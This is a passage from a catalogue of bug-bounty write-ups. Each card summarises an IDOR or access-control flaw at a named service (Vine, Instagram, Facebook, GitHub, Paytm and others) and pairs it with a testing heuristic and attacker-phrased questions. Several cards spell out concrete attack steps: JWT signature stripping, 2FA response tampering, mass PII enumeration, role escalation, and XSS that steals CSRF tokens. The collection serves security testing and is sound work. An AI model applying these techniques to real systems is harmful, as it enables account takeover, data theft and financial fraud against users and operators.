- Test: marketplace/gig apps — driver/vendor objects (avatar, feedback, ratings) keyed on uid/sequential id; frame impact as competitive sabotage (rewrite/delete rivals' reviews), not just data access.
- Q: "Can one vendor/driver edit or delete another's reviews/avatar by swapping the uid/feedback id? Are feedback ids sequential (mass-delete)?"

### [388] Vine (Twitter) — `GET /api/users/profiles/<userId>` returns full PII the UI hides (IP, email, phone, twitterId, location, lastLogin); swap userId for any user — Prial Islam ($7,560) [DUP-reinforce: profile API over-returns; CORS was locked but direct IDOR wasn't]
- Where: `https://vine.co/api/users/profiles/<userId>` (returns the complete user object).
- Approach/how-found: the endpoint returned his own full record; he first tried to steal it cross-origin via CORS (blocked), then simply swapped `userId` to a random value → another user's complete profile incl. `ipAddress`, `email`, `phoneNumber`, `twitterId`, `location`, `lastLogin`. Enumerable → dump all users; also impacts linked Twitter accounts.
- Test: profile/detail APIs commonly serialize far more than the UI shows — read the RAW JSON for hidden PII (IP/email/phone/linked-account ids). A locked CORS policy doesn't stop a same-origin id-swap; test the IDOR directly, not just the cross-origin angle.
- Q: "Does the profile JSON contain PII the UI hides? Can I swap the userId to dump any user's full record (and linked-account ids)?"

### [389] CRM — invitation IDOR → ATO chain: `POST /invitations/<id>/resend` returns the invitee email in JSON and id is sequential (enumerate other companies' invited emails); then register with a leaked email → app shows "Company X invited you, click resend" → the resend URL uses `resend_invitation` while the real accept link uses `join` → swap `resend_invitation`→`join` in the URL → joined the victim org — Plenum [NEW ★ email-leak IDOR + URL-VERB swap to self-accept an invitation → ATO]
- Where: `POST /invitations/<seq-id>/resend` (leaks email); accept URL path segment `resend_invitation` vs `join`.
- Approach/how-found: the unguessable 32-byte invite token seemed safe, but resend leaked the email by sequential invitation id. Registering with a leaked email surfaced a page whose "resend" link differed from the emailed "join" link only by a path word; changing `resend_invitation`→`join` accepted the invite without the token → org access/ATO.
- Test: even with strong invite tokens, the resend/status endpoint may leak the email by sequential id; compare the on-screen action URL to the emailed link — swapping a path verb (`resend`→`join`/`confirm`/`accept`) can self-accept without the secret token.
- Q: "Does resend/status leak the invitee email by enumerable id? Can I change a URL verb (resend→join/accept) to accept an invitation without the emailed token?"

### [390] JWT IDOR — signature not validated: order-status API accepted a JWT whose sig was ignored; shrink it to `{}.{"uid":"1234567890"}` (alg:none-style) and forge any `uid`; `GET /api/v1/order_statuses/{order_id}` → other users' address/payment/amount; works on past order ids; no rate limit → brute the uid×order_id space — Plenum ($1,500) [NEW ★ JWT claims unverified → forge uid; the "shortest token ever"]
- Where: `GET /api/v1/order_statuses/{order_id}` with `Authorization: Bearer <JWT{uid,sessionid}>`.
- Approach/how-found: the JWT carried uid+sessionid signed HS256, but the API validated none of it; he reduced the token to `{}.{"uid":...}` and it still worked → forge any uid; order ids also IDOR-able and historical; absent rate limiting made the 2-variable brute viable.
- Test: don't trust that a JWT is enforced — try alg:none / strip the signature / minimize claims and see if it's still accepted; then forge `uid`/`sub`; combine with a second IDOR id (order_id) and check rate limiting for brute feasibility.
- Q: "Does the server actually verify the JWT signature/alg, or just read the claims? Can I forge `uid`/`sub`? Is there rate limiting on the id brute?"

### [391] Privilege escalation — forge JWT by CRACKING a Math.random() UUID: JWT payload had `userId`(UUID)+IP+browser+OS; UUID seemed unguessable, but the client JS generated it with `Math.random()` → reconstruct the admin's UUID, re-encode the JWT → admin functionality — Jay Jani [NEW ★ predictable client-side UUID (Math.random) → forge the "unguessable" id]
- Where: JWT `userId` claim = UUID generated by client JS `Math.random()`.
- Approach/how-found: force-browse to admin features failed; analyzing requests showed a JWT carrying a UUID userId. Instead of giving up on the UUID, he located the JS that built it via `Math.random()` (which is not cryptographically secure and is crackable) → derived the target userId in plaintext → re-signed/encoded the JWT → admin access.
- Test: when an id is a "random" UUID/token, find the GENERATOR in the JS — `Math.random()`, timestamps, or sequential seeds are predictable/crackable; then forge it.
- Q: "How is this 'random' id generated (check the JS)? Is it `Math.random()`/time-seeded and therefore predictable? Can I reconstruct a victim/admin id and forge the token?"

### [392] Misconfigured API — read the docs, then swap id-TYPE: `GET api/.../<userID>` 404s unauthenticated, but putting the userNAME in the userID field → returns email/userId/userName/scope unauthenticated — Yeasir Arafat [NEW: the endpoint accepts a different identifier type than expected]
- Where: user-fetch API endpoint (expects userID; also accepts username).
- Approach/how-found: read `docs.redact.io` to learn the API; the userID lookup 404'd without auth, but supplying the USERNAME in that field returned the user's data with no authorization.
- Test: read the API docs first; try alternate identifier types in the id slot (username, email, slug, phone) — one may be unauthenticated where the numeric id is protected.
- Q: "Does the lookup accept username/email/slug instead of the numeric id? Is one identifier type unauthenticated while another is protected? What do the API docs reveal?"

### [393] Oculus — comment on a private bug report by swapping the UNCHECKED id: GraphQL comment mutation has `comment_parent_id` (bug id) AND `external_post_id` (comment id); swapping the bug id failed (it's checked), but swapping `external_post_id` to the victim's private comment id worked — only one of the two ids is authorized — Sarmad Hassan [NEW ★ when the obvious id is validated, attack the OTHER id in the same request]
- Where: `POST /graphql` comment mutation (`comment_parent_id` + `external_post_id`).
- Approach/how-found: private bugs block outside comments. Plan A (swap `comment_parent_id`=bug id) was rejected — they validate the bug id. Plan B (keep your bug id, swap `external_post_id` to the victim's private comment id) succeeded → comment posted on their private report. The server authorized the parent id but not the referenced comment id.
- Test: when a request carries MULTIPLE ids and the primary one is checked, swap the SECONDARY/related id (parent vs child, post vs comment, thread vs message) — partial authorization is common.
- Q: "Of the multiple ids in this request, which are actually validated? If the main id is checked, can I swap the secondary (comment/post/attachment) id to reach a protected object?"

### [394] Instagram — add a description to ANY public user's post: IGTV edit `POST /media/<media_id>/edit/ caption=&title=`; swap `media_id` (from the victim post's source or its like-request) → writes your caption to their post IF it has none; response is "Internal Server Error" but the write succeeds — Sarmad Hassan ($6,500) [NEW ★ write-IDOR conditioned on an empty field; verify via UI not response; mass celebrity impact]
- Where: `POST /media/<media_id>/edit/` (`caption`,`title`); media_id from post page source or the like request.
- Approach/how-found: editing his IGTV video sent the media id + caption; swapping media_id to another public user's post added a description on their behalf — works on photos/videos/IGTV, only when the post currently has no description. The server returned a 500 "Oops" yet the change applied (verified in the app).
- Test: edit/caption/title endpoints keyed on a content/media id → swap to a foreign post; the write may only apply to empty fields; ALWAYS verify the side effect in the UI, not via the (lying) response; media/content ids are in page source.
- Q: "Can I edit another user's post (caption/title/alt-text) by swapping the media/content id? Does it only work when the field is empty? Did the write apply despite a 500?"

### [395] New Relic — "Get as image" IDOR: POST `{"query":{"account_id":N,"nrql":"..."},"account_id":N}`; `account_id` not ownership-checked and INCREMENTAL → swap/Intruder to any account; rewrite the embedded NRQL (`SELECT * FROM SystemSample`); the `X-Image-Url` response + `?type=` (bad value error lists all chart types incl. `json`/`table`) + `&height=2000` → exfiltrate full data rendered as an image — Jon Bottarini ($2,500) [NEW ★★ swap account_id + rewrite the embedded query + abuse render options to exfiltrate]
- Where: dashboard "Get as image" POST (`account_id` + `nrql`); response `X-Image-Url` with `?type=`/`&height=` params.
- Approach/how-found: the image-export endpoint trusted the client `account_id`; incremental → any account. He then rewrote the `nrql` to dump everything; the returned `X-Image-Url` accepted `?type=json`/`table` (discovered because a bad type errored with the full permitted list) and `&height=2000` to fit more data → exfil arbitrary account data as a picture.
- Test: "export/render/get-as-image/PDF" features often carry an `account_id` AND an embedded QUERY you can both swap and rewrite; trigger errors to enumerate valid options (chart types, formats); bump output size/height to exfiltrate more.
- Q: "Does an export/render endpoint trust a client account_id? Can I rewrite the embedded query (NRQL/SQL/filter)? Do error messages list valid format/type options? Can I enlarge the output to dump more?"

### [396] Facebook Groups — cross-group unit theft + make units UNDELETABLE: `POST /groups/<g>/edit_units_dialog/submit group_id=&unit_ids[]=`; `group_id` is checked but `unit_ids` are NOT → add another group's unit to yours (then download via Group Insights); invite that group's admin into your group → their unit becomes undeletable — Sarmad Hassan [NEW ★ array of child ids unchecked while parent id is checked; chained with an invite for persistence]
- Where: `POST /groups/<group_id>/edit_units_dialog/submit` (`group_id` checked, `unit_ids[]` not).
- Approach/how-found: swapping `group_id` failed (validated), but injecting another group's `unit_ids` attached their units to his group (server never verified the units belong to that group). Those units then appeared in his Group Insights (downloadable); inviting the foreign admin made the units undeletable.
- Test: when a request has a parent id AND an array of child ids, the parent may be authz'd while the children aren't — inject foreign child ids to import/leak them; look for secondary effects (insights/export, persistence) and chain an invite/transfer for durable impact.
- Q: "Are the child ids (unit/item/member ids) validated against the parent, or only the parent id? Can I import foreign children into my container and read/export them? Can a chained invite make the effect persistent/undeletable?"

### [397] Confluent — unsubscribe link IDOR + content spoofing + open redirect: link carries `id` (brute → unsubscribe anyone), `message` (injected text), `unsubscribe_redirect_url` (open redirect) — all unsigned → phishing — Divyanshu [DUP-reinforce: unsigned email-action link with multiple attacker-controlled params]
- Where: unsubscribe URL params `id`, `message`, `unsubscribe_redirect_url`.
- Approach/how-found: the unsubscribe link took a raw `id` (enumerate → unsubscribe any subscriber), plus a `message` reflected on the page (content spoofing) and a redirect URL (open redirect to any site) → craft a convincing phishing unsubscribe page.
- Test: email action links (unsubscribe/confirm/verify) often carry id + display text + redirect with no signature — enumerate the id, inject the message, point the redirect at your site.
- Q: "Is this email link signed, or can I tamper id/message/redirect? Can I unsubscribe others by id and chain a spoofed message + open redirect for phishing?"

### [398] Private program — signature-file IDOR + QR-refund merchant fraud: uploaded `signature.png` stored at a predictable S3 path → script-download other users' signatures; QR-payment refund request response leaks `MERCHANT_ID`, and refunds aren't bound to the requester's session → refund from ANY merchant (hit offline stores incl. IRCTC); also re-test fixes on staging subdomains (found via VirusTotal) — Siva Krishna ($1,623 total) [NEW ★ predictable upload path + refund keyed on unbound merchant_id + staging-replay]
- Where: S3 upload path `.../signature.png`; QR refund request (`qrCodeId`→response `MERCHANT_ID`); staging subdomains.
- Approach/how-found: (1) the signature image lived at a guessable per-user path → enumerate and download others'. (2) scanning a QR returned the `MERCHANT_ID` in the response; the refund action didn't verify the merchant id against the session → refund money from other merchants' accounts. (3) when asked to verify a fix, he found staging subdomains on VirusTotal and replayed requests there (unpatched).
- Test: user-uploaded files (signatures, IDs, KYC) often sit at predictable paths — enumerate; payment/refund flows that echo a merchant/account id and don't bind it to your session = financial IDOR; harvest staging hosts (crt.sh/VirusTotal) and re-test there.
- Q: "Are uploaded files at a guessable path I can enumerate? Does refund/payout trust a merchant/account id not bound to my session? Are there staging subdomains running the unpatched code?"

### [399] Firebase Dynamic Links — register RESERVED `app.goo.gl` subdomains via param swap: `createDomainForProject` takes `domainUriPrefix`; change the value from `page.link` to `app.goo.gl` → create `<custom>.app.goo.gl` (a namespace reserved for official Google products) — websecblog [NEW ★ swap a parameter VALUE to a privileged/reserved namespace]
- Where: `POST /v1/createDomainForProject` body `domainUriPrefix` (page.link → app.goo.gl); separate `checkValidDomainForProject` validator.
- Approach/how-found: the console only let users pick `*.page.link`; changing `domainUriPrefix` to `app.goo.gl` in the create call succeeded → user-created `*.app.goo.gl` subdomains (should be Google-only), enabling convincing Google-branded short links. The validity check was a separate API from the create (so client-side gating didn't matter).
- Test: when a field is constrained to a set of values in the UI, send a value from a DIFFERENT/privileged set (reserved domain, internal type, higher tier); client-side validators (`checkValid...`) are separate from the action and bypassable.
- Q: "Can I set this field to a reserved/privileged value the UI doesn't offer (domain, tier, type)? Is the create call gated only by a separate client-side validator I can skip?"

### [400] IDOR → ATO via Facebook auth-callback `_user_id` swap: `/login/auth/facebook/callback?linking=true&...&_user_id=<UUID>`; change to a victim's user_id → your FB links to their account → "login with Facebook" → in with no password; sourced the UUID from S3 image URLs that embed `/media-uploads/<User-ID>/...` — Khizer ($1,200) [NEW ★ FB-link IDOR + harvest the "unguessable" id from an image's S3 path]
- Where: `/login/auth/facebook/callback?linking=true&_user_id=<UUID>`; user_id leaked in shared-image S3 path.
- Approach/how-found: the FB linking callback carried `_user_id`; swapping it to a 2nd account returned 200 and bound his Facebook to that account → password-less login = ATO. The triager doubted impact because user_id is a UUID — so he found it: any image the victim shared was hosted on S3 at `.../media-uploads/<User-ID>/...` → harvest the UUID.
- Test: social-link callbacks keyed on a user id → swap to bind your identity to a victim; when the id is a UUID, look for it in CDN/S3 asset paths, image URLs, profile sources.
- Q: "Can I link my OAuth identity by swapping `_user_id` in the callback? Where does the 'unguessable' UUID leak (S3/CDN image paths, asset URLs)?"

### [401] Current-password bypass + brute oracle: update-username/email POST has a HIDDEN `old_username`/`old_email` + `password`; the backend validates the credential PAIR but not that it belongs to the logged-in session → submit ATTACKER's valid creds to change username without your current password; AND put the VICTIM's username in `old_username` and brute `password` → success response = valid victim creds — Mandeep Jadon [NEW ★★ credential check not bound to session → confirm-password bypass AND offline-style brute via the update endpoint]
- Where: `POST /my/update/username` (`old_username`/`old_email`, `password`, csrf).
- Approach/how-found: the change required the current password, but the server only checked that `old_username`+`password` were a VALID pair — not that they matched the session. So any valid pair worked (bypass). Swapping in the victim's username and brute-forcing `password` turned the update endpoint into a login brute-force oracle (the "updated" response confirms valid creds).
- Test: when a sensitive change requires the current password, check whether the credential is tied to the SESSION or just validated as a pair; if the latter, it's both a confirm-bypass and a brute-force oracle — pass a victim identifier and fuzz the password.
- Q: "Is the current-password check bound to my session, or just 'is this a valid username+password'? Can I pass a victim's identifier and brute the password field for a login oracle?"

### [402] Naaptol — incremental address-id PII leak: shipping-address request returns full name/address/mobile by `address_id`; incremental (17917835→…837) → Intruder → millions of users' PII — Avinash Jain [DUP-reinforce: checkout address lookup keyed on sequential id]
- Where: checkout shipping-address request, incremental `address_id`.
- Approach/how-found: the address request returned full user details; ids were sequential → decrement/increment then Intruder to mass-harvest PII.
- Test: e-commerce checkout/address/order endpoints keyed on sequential ids are reliable mass-PII IDORs — always enumerate to quantify impact.
- Q: "Does the checkout/address endpoint return PII by a sequential id? Can I Intruder the range to prove millions-of-users impact?"

### [403] Facebook — add anyone to a page's "Top Fans" via `fan_id` swap: the "display Top Fans badge" request carries `fan_id`; change to a victim's id → adds them to a page's Top Fans without their consent — Jafar Abo Nada [NEW: consent/opt-in bypass — perform an opt-in action ON BEHALF of another user]
- Where: Top Fans join/badge request, `fan_id` parameter.
- Approach/how-found: joining "Top Fans" should require the user's own approval; the request keyed on `fan_id` with no check that it's the sender → swap to add any user to any page's Top Fans.
- Test: opt-in/consent actions (join, subscribe, accept, RSVP) keyed on a user id → swap to perform them on behalf of others (forced association / consent bypass).
- Q: "Does this opt-in/consent action verify the user id is mine? Can I subscribe/join/accept on behalf of another user by swapping their id?"

### [404] Facebook Messenger Rooms — non-admin can reject join requests: the reject-member endpoint (`thread_id`+`user_id`) never checks the caller is the room admin → any room member rejects pending users — Jafar Abo Nada [NEW: function-level authz missing on a moderation action (not id-swap, role-check absent)]
- Where: Messenger Rooms reject-member POST (`thread_id`, `user_id`).
- Approach/how-found: only the room admin should accept/reject; the reject endpoint authorized neither role nor ownership — as long as you were in the room you could set `thread_id`=target room, `user_id`=target user → reject them.
- Test: moderation/admin actions (accept/reject/kick/approve) — test them as a NON-privileged member; the server may check membership but not ROLE.
- Q: "Does this admin/moderator action verify my ROLE, or just that I'm in the room/group? Can a regular member perform it?"

### [405] Yahoo — delete any product comment: delete-comment request keyed on a comment `id`; swap from your id to another user's → their comment deleted — black_b [DUP-reinforce: destructive comment IDOR by id swap]
- Where: product-comment delete request, comment `id`.
- Approach/how-found: on a Yahoo product-reviews page, the delete action keyed only on the comment id; replacing his with another user's deleted theirs.
- Test: comment/review delete endpoints keyed on a comment id with no owner check → delete others' content.
- Q: "Can I delete another user's comment/review by swapping the comment id? Is ownership checked on delete?"

### [406] Food-delivery app — ATO chain: `/auth` returns `USER_ID`+`PHONE` even on FAILED login (info disclosure); `/otp` sends an OTP to any number; `/update` changes the phone keyed on `up_uid` (IDOR) → set `up_uid`=victim's USER_ID with your own OTP → victim's phone becomes attacker's → reset → ATO — s0cket7 [NEW ★ failed-auth response leaks USER_ID + phone-update IDOR via up_uid → ATO]
- Where: `POST /auth` (leaks USER_ID/PHONE on failure), `POST /otp` (send OTP to attacker number), `POST /update` (`up_uid`, `upvf_ph`, `upvf_pin`).
- Approach/how-found: a failed login still returned the account's USER_ID and phone. The phone-change verified an OTP, but the update request bound the change to a client-supplied `up_uid`; swapping it to a victim's USER_ID (from stage 1) while supplying an OTP sent to the attacker's own number updated the VICTIM's phone → password reset → ATO.
- Test: check auth responses on FAILURE for leaked ids/PII; phone/email-change flows that "verify an OTP" may still bind the update to a swappable user id — supply your own OTP but the victim's uid.
- Q: "Does a failed login leak USER_ID/phone? Does the verified phone/email update bind to a client `uid` I can swap? Can I verify with MY otp but change the VICTIM's contact?"

### [407] Edmodo — steal Google Drive access tokens of any user: endpoint #1 (is-linked check, `user_id`) Intruder'd → harvest user_ids who linked Drive (+timestamps); endpoint #2 (`provider`+`user_id`) returns the Drive access TOKEN, not validating the user → swap user_id → get any user's OAuth token — Aagam Shah [NEW ★ enumerate a "is-linked" oracle, then a token-mint endpoint by user_id → others' 3rd-party tokens]
- Where: link-check API (`user_id` → exists+timestamp); token API (`provider`,`user_id` → access_token).
- Approach/how-found: adding files from Drive triggered (1) a check of whether the user linked Drive — Intruder over `user_id` mapped all linked users; then (2) a token endpoint that, given `provider`+`user_id`, returned that user's Drive access token with no ownership check.
- Test: OAuth/3rd-party integration flows: find the "is X linked?" enumeration oracle, then the token/credential endpoint keyed on user_id — swap to mint/read other users' provider tokens.
- Q: "Is there an endpoint that returns a user's linked-service access token by user_id? Can I first enumerate which users linked the service, then pull their tokens?"

### [408] Crypto exchange — full ATO: `POST /api/reset_password` keyed on an INCREMENTAL `id` (swap → reset any account) chained with 2FA bypass (the verify response can be flipped to true / token `123456` accepted); admin email/id found via ticket-system IDOR — mabdullah22 [NEW ★ reset-by-incremental-id + client-side 2FA response tampering]
- Where: `POST /api/reset_password` (`id`, incremental); 2FA verify request (response-tamperable).
- Approach/how-found: the reset wasn't token-based — it carried a sequential user `id`; swapping it reset another account. Login then required 2FA, but intercepting the verify response and setting it true (or sending `123456`) bypassed it → full takeover. Their ticket system leaked the admin's id via IDOR.
- Test: password-reset that carries a user id (not an emailed token) is reset-IDOR; 2FA/OTP gates enforced on the CLIENT can be bypassed by editing the response (true/false) — always test response tampering.
- Q: "Does reset use a swappable user id instead of a bound token? Is 2FA verified server-side, or can I flip the verify response to true? Does the ticket/support system leak admin ids?"

### [409] Paytm — bill-pay PII IDOR: electricity-bill lookup takes `recharge_number` (account) + `recharge_number_2` (mobile) supposedly validated together, but changing the account number with ANY mobile returns the real user's bill/name/address; no throttling → Intruder thousands — Avinash Jain [DUP-reinforce: "two fields must match" but only one is actually checked; utility bill PII]
- Where: bill-fetch request (`recharge_number` + `recharge_number_2`).
- Approach/how-found: the request looked like it validated account+mobile as a pair, but only the account number mattered → arbitrary account number + random mobile returned that consumer's full bill/PII; sequential consumer numbers + no rate limit → mass harvest.
- Test: utility/bill/booking lookups that "require two matching fields" — vary each independently; one is usually the real key; enumerate it for mass PII (these third-party-data flows are often dismissed then re-accepted).
- Q: "Do both 'matching' fields actually get validated, or just one? Can I fix a random secondary value and enumerate the primary id for PII?"

### [410] Facebook "Top Fans" add-anyone (cross-posted mirror of [403]) — same `fan_id`-swap consent bypass, hosted on updatelap.com — Jafar Abo Nada [DUP of 403: same technique, different source]
- Where: same Top Fans join/badge request (`fan_id`).
- Note: identical finding to card [403]; recorded for per-index completeness. See [403] for the full test/question.
- Q: "(see [403]) Can I perform an opt-in action on behalf of another user by swapping their id?"

### [411] Microsoft Translator Hub — delete 13k+ projects: `POST /Projects/RemoveProject?projectId=12839` (id in URL, empty body) has no ownership check and no CSRF token → swap projectId to another account's, or loop 0→13000 → delete every project — Haider ($MS Hall of Fame) [DUP-reinforce: delete-by-id in URL, no authz + no CSRF → mass destruction]
- Where: `POST /Projects/RemoveProject?projectId=<n>` (no body, no anti-CSRF).
- Approach/how-found: the remove action put the project id in the URL; a 2nd account's project id deleted theirs (no owner check); ids sequential → loop to wipe all 13k projects. Also CSRF-able (no token) → delete via a victim's browser if you know their projectId.
- Test: delete endpoints with the id in the query string and no anti-CSRF are double-trouble — IDOR (swap id, enumerate range) AND CSRF (force via img/iframe).
- Q: "Does this delete trust a URL id with no owner check? Are ids sequential (mass-delete)? Is there an anti-CSRF token, or can I trigger it cross-site?"

### [412] Gsuite Hangouts Chat — bot-webhook IDOR ($5k): the `batchexecute mutate` request's `f.req` carries the webhook id AND the chatroom `space/<id>`; swap either → delete/edit/add bot webhooks in ANY chatroom (incl. adding your own bot to read/post messages) — secretlyhidden [NEW ★ decode batchexecute f.req; webhook id + space id both unauthorized; add-your-bot-to-victim-room]
- Where: `POST /_/DynamiteWebUi/mutate` `f.req=[...webhook_id...space/<id>...]` (chat.google.com).
- Approach/how-found: tested the new product; the webhook delete/edit/add `f.req` (URL-encoded JSON) contained the bot-webhook id and the space id; the webhook area never checked authorization → swap ids to delete/edit others' webhooks or ADD your own bot to a victim space (then read @-mentions / post messages).
- Test: URL-decode Google `batchexecute`/`mutate` `f.req` to expose the embedded ids (object + container); webhook/integration management is a frequently-missed authz gap — try add (inject your bot) not just delete.
- Q: "What ids are inside the encoded `f.req` (webhook + space)? Can I add MY bot/webhook to a victim's room to read/post? Is webhook management authz-checked at all?"

### [413] Read-only → ADMIN chain: diff the admin-site `/api/register` vs core-app request (missing `securityQuestions`) → register on admin.site.com; 2FA bypass with `123456`; `POST /api/users/newAuthenticationCode/<user_id>` (swap id) regenerates ANY user's 2FA QR → import to your authenticator; empty `/api/users/search` dumps the user DB; `PUT /api/users` edits others by id (error "Something went wrong" but it SUCCEEDS); `POST /api/account/updateAdmin` sets `authorities:["ROLE_ADMIN"]` on your id → full admin — NahamSec [NEW ★★ request-diffing + 2FA-regen IDOR + error-lies + role mass-assignment]
- Where: `/api/register` (admin host), `/api/users/newAuthenticationCode/<id>`, `/api/users/search`, `PUT /api/users`, `POST /api/account/updateAdmin` (`authorities`).
- Approach/how-found: admin registration failed until he COMPARED it to the core-app register request and added the missing `securityQuestions` field. 2FA accepted `123456`. `newAuthenticationCode/<user_id>` regenerated any user's 2FA secret (swap id → QR → take over their 2FA). Blank search params dumped all users. `PUT /api/users` with another id returned an error but actually changed the data (don't trust errors). Finally `updateAdmin` let him set `authorities` to ROLE_ADMIN on his own read-only account (mass-assignment) — even from a core-app account, since admin endpoints were reachable if you knew the routes.
- Test: DIFF the same endpoint across hosts/roles to find the missing field that unlocks it; 2FA-secret REGEN endpoints keyed on user id let you re-enroll others' 2FA; confirm writes despite error messages; hunt a `updateAdmin`/role-setting endpoint that accepts `authorities`/`role` (mass-assignment); admin API routes are often reachable by low-priv users who know the path.
- Q: "What field does the admin request need that I can copy from the core app? Can I regenerate a victim's 2FA via a user-id'd endpoint? Did my edit succeed despite the error? Is there an endpoint that lets me set my own `authorities`/role to admin?"

### [414] GitHub — member → org OWNER ($10k): the App/integration install flow has `target_id` (=organization/account id); a member (auto repo-admin on any repo they create) swaps `target_id` to a victim org → installs the app despite the "third-party access policy"; requested SCOPES aren't enforced (install permission is binary) → call the "add/update org membership" API with `role=owner` → invite yourself as owner — Tanner [NEW ★★ target_id swap to install an integration into a foreign org + unenforced app scopes → super-admin]
- Where: GitHub App install URL `target_id=<org_id>`; org-membership API with `role`.
- Approach/how-found: members can't install apps, only owners — but the install URL's `target_id` was swappable to an org where he was merely a member with repo-admin (any member gets admin on repos they create, default-on). The app installed; its requested scopes (write to all members/teams) weren't validated because "installed = trusted". He then used the API to add himself as org OWNER via the `role` param.
- Test: app/integration/webhook install flows keyed on `target_id`/`org_id`/`account_id` — swap to a foreign org; once installed, requested OAuth scopes may be unchecked (binary trust); look for a membership/role API with a `role` param to self-promote. Note default settings (members can create repos → repo admin) widen the attacker set.
- Q: "Can I install an app/integration into an org I'm only a member of by swapping target_id? Are the app's requested scopes enforced, or is install binary-trusted? Is there a membership API with a role param to make myself owner?"

### [415] Password-reset verification not bound to the completer: attacker requests reset for the victim; when the VICTIM clicks their reset link, the server marks the reset 'verified' and lets the password be changed via an endpoint that carries only the email (no token) — so the attacker (who initiated) can now set the victim's password — Khaled Hassan ($1,250) [NEW ★ reset 'verified' state is global, not tied to the session that clicked the link]
- Where: reset-completion endpoint (`email` only, no token/auth) — becomes usable after ANY click of the reset link.
- Approach/how-found: changing the `email` directly returned 403 (so it's not naive IDOR). The real flaw: once a reset link (that the attacker requested for the victim) is clicked, the server authorizes password changes for that email via the tokenless endpoint — and the attacker's session can do it. Works when a user abandons their own reset, or when the victim clicks the attacker-initiated link.
- Test: in reset flows, check whether "link clicked = verified" is global state vs bound to the clicker's session/token — if global, initiating a reset and getting the victim to click (or catching an abandoned reset) lets you complete it.
- Q: "After the reset link is clicked, can ANY session change that account's password via a tokenless endpoint? Is the verified state tied to the specific token/session, or just the email?"

### [416] IDOR-write-into-every-account + stored XSS → mass ATO: an IDOR let him create "element x" in ANY user's account; injecting a JS payload into element x's text field stored XSS in all accounts; with no CSP, the script steals the CSRF token → change email / invite attacker as admin → take over all accounts; separately a blind-XSS in invoice name/address fired in the admin panel exposing ~1000 invoices — witcoat ($3,500 each) [NEW ★ IDOR that WRITES attacker content into others' accounts → stored XSS → mass takeover]
- Where: create-"element" endpoint (IDOR write to any account); invoice billing fields (blind XSS).
- Approach/how-found: the create-element action let him target any user's account (IDOR write); the element's text field rendered unsanitized → stored XSS delivered to every account; the payload stole the email-change CSRF token and changed the email / added admin. The billing invoice fields carried a blind-XSS payload that executed in the staff admin panel (XSS Hunter), leaking customer invoices.
- Test: an IDOR that WRITES into other users' objects is far more powerful if the written field is rendered (stored XSS → mass ATO); plant blind-XSS in fields that staff review (invoices, support tickets, billing) to reach admin panels.
- Q: "Can this IDOR WRITE content into other users' accounts (not just read)? Is that content rendered (stored XSS → ATO)? Which fields get viewed by staff (blind XSS to admin panel)?"

### [417] Picturepush — read any private album's PASSWORD via IDOR: the album "Access Rights" page exposes the album password and is keyed on a swappable album id → view any user's private-album password — Murtada Kamil [NEW: a settings/access page leaks the protecting secret itself]
- Where: album "Access Rights" page, album id parameter (reveals the password).
- Approach/how-found: creating a password-protected album, the owner's Access Rights view showed the password; the page keyed on the album id with no owner check → swap the id → read any album's password → open the "private" album.
- Test: "access rights/sharing/security settings" pages sometimes display the protecting secret (password/PIN/key) and are keyed on an object id — swap to read others' secrets and bypass the protection.
- Q: "Does a settings/access page reveal the object's own password/PIN/key? Is it keyed on a swappable id so I can read another user's protecting secret?"

### [418] Password reset via base64(email) link + OSINT emails: the reset link is just `base64(email--company)/base64(timestamp--company)` with no real token; harvest valid user emails from the company's Facebook-page comments → forge reset links → ATO — Dr. Gupta [DUP-reinforce: reset token is decodable/forgeable email; source victim emails via OSINT]
- Where: reset URL = base64(email) + base64(timestamp); same scheme as the signup verify link.
- Approach/how-found: Burp-decoded the reset link → it only encoded the email + timestamp (and company name), no signed token; the signup verification link used the same scheme. So any email → forge the reset link. Valid emails were public in the company's Facebook page comments.
- Test: decode base64/hex/JWT in reset & verify links — if they only wrap email+timestamp with no signature, forge them; harvest target emails from social comments, breach dumps, `site:` dorks.
- Q: "Is the reset/verify link a forgeable encoding of email+timestamp (no signature)? Where can I source valid victim emails (social comments, dorks)?"

### [419] Currency exchange — STATIC reset token: the password-reset hash is identical for every request AND every account → just open the reset form (new/confirm password) for any account, including admin → ATO — Aayush Pokhrel [NEW ★ the "reset token" is a constant, reused across all users]
- Where: password-reset completion form; reset hash is constant.
- Approach/how-found: requested reset twice → identical hash; requested for a different account → STILL the same hash. The token was a fixed constant, so the reset form worked for any account → reset admin's password → admin ATO.
- Test: request a reset several times and for several accounts and COMPARE the tokens — if the token is static/repeating (or predictable), you can complete anyone's reset; try the reset form directly with the known constant.
- Q: "Is the reset token actually unique per request/account, or is it static/repeating? Does the same token complete a reset for a different account (incl. admin)?"

### [420] Facebook Workplace — disclose a private video thumbnail via CANVAS `video_id` swap + send-to-phone bypass: the page CANVAS edit request carries `video_id`; swap to any public/friends-only/Workplace-PRIVATE video id → it loads into your canvas; preview is blocked, but "send canvas preview to your phone" renders the thumbnail of the private Workplace video — Sarmad Hassan ($3,000) [NEW ★ media_id swap across product (Workplace) + alternate render channel to bypass a preview block]
- Where: `POST /v2.11/<page_id>` CANVAS edit, `video_id`; "send canvas to phone" preview channel.
- Approach/how-found: the canvas video element keyed on `video_id`; swapping it embedded others' videos (incl. Workplace posts, which are private to a company). Web preview just showed a spinner (blocked), but sending the canvas preview to his phone rendered the thumbnail → leaked private Workplace video content.
- Test: media/content-id IDORs that "don't preview" on web may render through an ALTERNATE channel (mobile preview, email, PDF/export, oEmbed) — try those; the same id often reaches private cross-product content (Workplace/Groups).
- Q: "Does a media_id swap pull private/cross-product content? If web preview is blocked, does an alternate render channel (mobile/email/export) show it (even just a thumbnail)?"

### [421] Newsletter — confirm anyone's subscription without consent: the confirmation email link splits into endpoint+action+`data`(token); the token isn't bound to the requester → reuse/tamper to confirm-subscribe arbitrary emails — Mohammed Israil (bof.nl) [NEW: opt-in confirmation link not bound to the subscriber → forced subscription]
- Where: newsletter confirmation link (`endpoint`/`action`/`data` token).
- Approach/how-found: the confirm link's token wasn't tied to who requested it, so the confirmation step could be driven for other addresses → activate subscriptions without the user's knowledge (spam/annoyance, and a building block for trust abuse).
- Test: double-opt-in confirm links — check whether the token is bound to the specific email/session or reusable/forgeable to confirm others; same pattern applies to verify/accept/opt-in flows.
- Q: "Is the confirm/opt-in token bound to the requester, or can I confirm subscriptions/actions for other emails? Is it forgeable?"

